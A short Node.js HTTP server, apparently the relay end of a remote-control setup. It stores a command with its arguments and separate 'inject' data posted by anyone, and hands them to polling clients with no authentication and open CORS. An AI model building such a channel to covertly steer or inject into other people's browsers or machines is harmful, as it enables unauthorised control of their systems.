const http = require('http');
const fetch = require('node-fetch');

let lastCommand = "";
let lastArgs = [];
let lastInjectData = null;

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method === 'POST' && req.url === '/inject') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            lastInjectData = JSON.parse(body);
            res.end(JSON.stringify({ status: "OK" }));
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { command, args } = JSON.parse(body);
            lastCommand = command;
            lastArgs = args || [];
            res.end(JSON.stringify({ status: "OK" }));
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/data') {
        res.end(JSON.stringify({
            command: lastCommand,
            args: lastArgs,
            injectData: lastInjectData
        }));
        lastCommand = "";
        return;
    }

    res.writeHead(404);
    res.end("Not Found");
});

server.listen(process.env.PORT || 3000);
